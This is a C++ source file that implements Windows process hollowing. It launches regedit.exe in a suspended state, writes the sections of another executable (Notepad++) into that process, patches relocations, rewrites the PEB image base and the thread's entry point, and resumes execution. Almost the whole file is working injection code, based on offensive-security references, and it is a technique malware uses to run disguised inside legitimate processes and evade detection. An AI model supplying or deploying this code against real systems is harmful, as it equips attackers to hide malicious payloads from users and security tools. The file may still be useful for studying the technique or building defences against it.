#include <Windows.h>
#include <iostream>
#include <vector>
#include <strsafe.h>
#include <winternl.h>
#include <cstdint>


//Code based on https://github.com/m0n0ph1/Process-Hollowing, https://www.ired.team/offensive-security/code-injection-process-injection/ and https://github.com/adamhlt/Process-Hollowing

//Structure definitions
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

//--------------


//Suspended process handles
LPSTARTUPINFOA si;
LPPROCESS_INFORMATION pi;
PROCESS_BASIC_INFORMATION* PBI;
//------------------------


//Inyected code data
LPVOID imageBase = 0;
std::vector<uint8_t> binaryBuffer;

//--------

//Executables
char hollowed_proc[] = "C:\\Windows\\regedit.exe";
char target_binary[] = "C:\\Program Files\\Notepad++\\notepad++.exe";

//------


void CreateSuspendedProcess()
{
	si = new STARTUPINFOA();
	pi = new PROCESS_INFORMATION();

	auto res = CreateProcessA(NULL, hollowed_proc, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, si, pi);
	if (!res) {
		std::cout << "Could not create suspended process" << std::endl;
		exit(1);
	}

	std::cout << "[*] Created process: " << hollowed_proc << std::endl;
}

void LoadTargetBinaryIntoHollowProc()
{

	//Read the target binary
	HANDLE fd = CreateFileA(target_binary, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (fd == INVALID_HANDLE_VALUE) {
		std::cout << "Could not open file" << std::endl;
		TerminateProcess(pi->hProcess, 1);

		exit(1);
	}
	DWORD fileSize = GetFileSize(fd, 0);

	binaryBuffer.resize(fileSize);
	BOOL ret = ReadFile(fd,binaryBuffer.data(), fileSize, 0, 0);
	if (!ret) {
		std::cout << "Could not read file" << std::endl;
		TerminateProcess(pi->hProcess, 1);
		exit(1);
	}
	CloseHandle(fd);

	std::cout << "[*] Reading the target binary " << target_binary << std::endl;


	//Get binary headers
	PIMAGE_DOS_HEADER targetDosHeader = (PIMAGE_DOS_HEADER)binaryBuffer.data();
	PIMAGE_NT_HEADERS64 targetNtHeader = (PIMAGE_NT_HEADERS64)(binaryBuffer.data() + targetDosHeader->e_lfanew);
	DWORD sizeOfTargetImage = targetNtHeader->OptionalHeader.SizeOfImage;


	//Allocate new memory for our executable

	LPVOID newExecPtr = VirtualAllocEx(pi->hProcess, nullptr, sizeOfTargetImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!newExecPtr) {
		std::cout << "Could not allocate memory";
		TerminateProcess(pi->hProcess, 1);
		exit(1);
	}

	imageBase = newExecPtr;

	std::cout << "[*] Memory allocated for target binary at address 0x" << std::hex << imageBase << std::endl;

	//Calculate the delta between the new and previous executables, this will be used for the relocations later in the process.
	DWORD64 imageBaseDelta = (DWORD64)imageBase - targetNtHeader->OptionalHeader.ImageBase;

	std::cout << "[*] Imagebase delta 0x" << std::hex << imageBaseDelta << std::endl;


	targetNtHeader->OptionalHeader.ImageBase = (DWORD64)imageBase;

	//Write new header with updated imageBase
	std::cout << "[*] Writing updated header" << std::endl;

	ret = WriteProcessMemory(pi->hProcess, imageBase, binaryBuffer.data(), targetNtHeader->OptionalHeader.SizeOfHeaders, nullptr);

	if (!ret) {
		std::cout << "Could not write headers to process";
		TerminateProcess(pi->hProcess, 1);
		exit(1);
	}


	//Write new executable's sections to process

	std::cout << "[*] Copying target binary sections to process..." << std::endl;
	PIMAGE_SECTION_HEADER targetSectionHeader = (PIMAGE_SECTION_HEADER)(binaryBuffer.data() + targetDosHeader->e_lfanew + (sizeof(IMAGE_NT_HEADERS)));

	//Save old sectionHeader for rellocations later
	PIMAGE_SECTION_HEADER relocSection = 0;

	for (DWORD i = 0; i < targetNtHeader->FileHeader.NumberOfSections; i++)
	{
		PVOID dest = (PVOID)((DWORD64)imageBase + targetSectionHeader->VirtualAddress);
		PVOID src = (PVOID)(&binaryBuffer[targetSectionHeader->PointerToRawData]);

		BOOL ret = WriteProcessMemory(pi->hProcess, dest, src, targetSectionHeader->SizeOfRawData, nullptr);

		if (!ret) {
			auto err = GetLastError();
			std::cout << "Error while writing sections to process" << std::endl;
			TerminateProcess(pi->hProcess,1);
			exit(1);
		}

		//Set .text section to r/x
		if (!strcmp((char*)targetSectionHeader->Name, ".text")) {
			DWORD previousProtection = 0;
			auto ret = VirtualProtectEx(pi->hProcess, dest, targetSectionHeader->SizeOfRawData, PAGE_EXECUTE_READ, &previousProtection);
			if (!ret) {
				std::cout << "Error while applying permissions to .text section" << std::endl;
			}
		}

		if (!strcmp((char*)targetSectionHeader->Name, ".reloc"))
		{
			relocSection = targetSectionHeader;
		}

		targetSectionHeader++;
	}

	std::cout << "[*] Patching relocations..." << std::endl;
	//handle relocations
	if (imageBaseDelta != 0)
	{
		IMAGE_DATA_DIRECTORY relocData = targetNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		DWORD relocTableRaw = relocSection->PointerToRawData;
		DWORD offset = 0;

		//Patch table
		while (offset < relocData.Size)
		{
			//Get block header
			PIMAGE_BASE_RELOCATION blockHeader = (PIMAGE_BASE_RELOCATION) &binaryBuffer[relocTableRaw + offset];
			offset += sizeof(IMAGE_BASE_RELOCATION);

			DWORD entries = (blockHeader->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);


			//Patch entries
			for (int entry = 0; entry < entries; entry++)
			{
				PBASE_RELOCATION_ENTRY currentEntry = (PBASE_RELOCATION_ENTRY)&binaryBuffer[relocTableRaw + offset];
				offset += sizeof(BASE_RELOCATION_ENTRY);

				if(currentEntry->Type == 0) {
					continue;
				}

				DWORD64 fieldAddr = (DWORD64)imageBase + blockHeader->VirtualAddress + currentEntry->Offset;

				//Get old address of reloc
				DWORD64 patched_reloc_addr = 0;
				auto ret = ReadProcessMemory(pi->hProcess, (LPVOID)fieldAddr,&patched_reloc_addr, sizeof(DWORD64), nullptr);
				if (!ret) {
					std::cout << "Error while reading old reloc address " << std::endl;
					TerminateProcess(pi->hProcess, 1);
					exit(1);
				}
				//Update with delta
				patched_reloc_addr += imageBaseDelta;

				ret = WriteProcessMemory(pi->hProcess, (LPVOID) fieldAddr, &patched_reloc_addr, sizeof(DWORD64), nullptr);

				if (!ret) {
					std::cout << "Could not write to process";
					TerminateProcess(pi->hProcess, 1);
					exit(1);
				}
			}
		}

	}

	//Get thread context

	CONTEXT newContext = CONTEXT();

	newContext.ContextFlags = CONTEXT_FULL;

	GetThreadContext(pi->hThread, &newContext);

	//Update PEB with new image Base
	ret = WriteProcessMemory(pi->hProcess, (LPVOID)(newContext.Rdx + 0x10), &targetNtHeader->OptionalHeader.ImageBase, sizeof(PVOID), nullptr);

	if (!ret) {
		std::cout << "Could not write to process";
		TerminateProcess(pi->hProcess, 1);
		exit(1);
	}

	//Change entry point
	newContext.Rcx = (DWORD64) imageBase + targetNtHeader->OptionalHeader.AddressOfEntryPoint;

	std::cout << "[*] Updating thread context with new entry point at 0x" << std::hex << newContext.Rcx << std::endl;


	SetThreadContext(pi->hThread, &newContext);

	//And finally, resume execution of our new executable
	ResumeThread(pi->hThread);

}

int main(int argc, char** argv)
{
	CreateSuspendedProcess();
	LoadTargetBinaryIntoHollowProc();

	system("pause");


	delete PBI;
	delete si;
	delete pi;
}

